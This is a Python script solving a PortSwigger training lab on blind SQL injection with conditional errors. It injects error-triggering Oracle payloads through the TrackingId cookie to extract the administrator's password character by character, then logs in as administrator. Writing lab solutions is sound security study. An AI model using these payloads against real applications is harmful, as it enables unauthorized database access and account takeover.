# Script for Portswigger lab "Blind SQL injection with conditional errors"

import requests
from lxml import html
from rich.console import Console
from rich.progress import track

console = Console()


SERVER="https://0a3500e0032161cd80f2307000290005.web-security-academy.net/"
LOGIN_ENDPOINT = 'login'


session = requests.session()
response = session.get(SERVER)
tracking_id = session.cookies['TrackingId']
alphabet = 'abcdefghijklmnopqrstuvwxyz0987654321'


def find_password_length():
    response_codes = []

    console.log("Search password length between 1 and 30")
    for length in track(range(1, 31)):
        query_len = f"{tracking_id}' and (SELECT CASE WHEN ((select length(password) from users where username='administrator') = {length}) THEN TO_CHAR(1/0) ELSE 'ciao' END FROM dual) = 'ciao"

        response = session.get(SERVER, cookies={
            'TrackingId': query_len
        })
        console.print(f"CODE: {response.status_code}\tLength: {length}")
        response_codes.append((response.status_code, length))

    response_codes.sort(key=lambda record: record[0], reverse=True)
    console.log(f"Length found: {response_codes[0]}" if response_codes[0][0] > response_codes[0][1] else "Length not found")
    
    return response_codes[0][1]


def find_password(length):
    password = ""
    for index in track(range(1, length+1), console=console):
        response_codes = []
        console.print(f'Trying char at index {index}')
        for char in alphabet:
            query_substring = f"{tracking_id}' and (SELECT CASE WHEN ((select substr(password, {index}, 1) from users where username='administrator') = '{char}') THEN TO_CHAR(1/0) ELSE 'ciao' END FROM dual) = 'ciao"
            response = session.get(SERVER, cookies={
                'TrackingId': query_substring
            })
            response_codes.append((response.status_code, index, char))

        response_codes.sort(key=lambda x: x[0], reverse=True)
        password += response_codes[0][2]
        console.print("-------------------------------------------")
        console.print(f"CURRENT PASSWORD: {password}")
        console.print("-------------------------------------------")
    
    return password



def login(password):
    response = session.get(SERVER+LOGIN_ENDPOINT)
    html_document = html.fromstring(response.content)
    csrf = html_document.xpath("//input[@name='csrf']/@value")[0]

    response = session.post(SERVER+LOGIN_ENDPOINT, data={
            'csrf': csrf,
            'username': "administrator",
            'password': password
        },)

    console.print(f"CODE: {response.status_code}")
    console.print(response.text)


length = find_password_length()
password = find_password(length)
login(password)
# password found: niqo4vmq3u1t4lwbt48p